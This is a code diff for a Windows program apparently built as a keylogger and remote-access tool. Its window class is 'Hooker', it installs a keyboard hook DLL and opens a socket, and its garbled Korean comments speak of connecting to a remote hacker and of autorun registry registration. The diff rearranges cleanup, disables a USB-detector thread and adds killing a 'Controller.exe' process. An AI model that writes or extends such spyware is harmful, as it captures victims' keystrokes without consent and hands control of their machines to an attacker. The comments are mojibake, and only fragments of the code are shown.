@@ -4,7 +4,6 @@
 HINSTANCE g_hInst;
 LPCTSTR lpszClass = TEXT("Hooker");
 HWND hWndMain;
-LPCTSTR FileName = TEXT("C:\\data.txt");
 SOCKET hSocket;
 SOCKADDR_IN hAddr;
 HANDLE hFile;
@@ -32,6 +31,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main¿ªÇÒ°
 	WNDCLASS WndClass;
 	WSADATA wsaData;
 
+	setlocale(LC_ALL, "Korean");
+
 	g_hInst = hInstance;
 	//À©µµ¿ì »ý¼º
 	WndClass.cbClsExtra = 0;
@@ -57,9 +58,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main¿ªÇÒ°
 	CreateSocket();
 	//¿ø°ÝÇØÄ¿¿¡°Ô Á¢¼Ó½ÃµµÇÒ ¾²·¹µå »ý¼º ,USB µðÅØÅÍ ½º·¹µå ½ÇÇà
 	Con_pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectProc, NULL, 0, 0);
-	USB_pThread = (HANDLE)_beginthreadex(NULL, 0, USBDetector, NULL, 0, 0);
-	//·¹Áö¸®½ºÆ®¿¡ ÀÚµ¿ºÎÆÃÇ×¸ñµî·Ï
-	//Register(); 
+	//USB_pThread = (HANDLE)_beginthreadex(NULL, 0, USBDetector, NULL, 0, 0);
+	
 
 	
 	while (GetMessage(&Message, NULL, 0, 0)) {
@@ -67,15 +67,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main¿ªÇÒ°
 		DispatchMessage(&Message);
 	}
 
-	closesocket(hSocket);
-	Kuninstallhook();
-	FreeLibrary(KhinstDll);
-	TerminateThread(Con_pThread, dwResult);
-	TerminateThread(USB_pThread, dwResult);
-	CloseHandle(Con_pThread);
-	CloseHandle(USB_pThread);
-	WSACleanup();
-	MessageBox(hWnd, TEXT("Á¾·á"), TEXT("¾Ë¸²"), MB_OK);
+	
 	return (int)Message.wParam;
 
 }
@@ -116,6 +108,11 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
 
 	case WM_DESTROY:
 
+		closesocket(hSocket);
+		Kuninstallhook();
+		FreeLibrary(KhinstDll);
+		WSACleanup();
+		KillProcess(TEXT("Controller.exe"));
 		PostQuitMessage(0);
 		return 0;
 	}
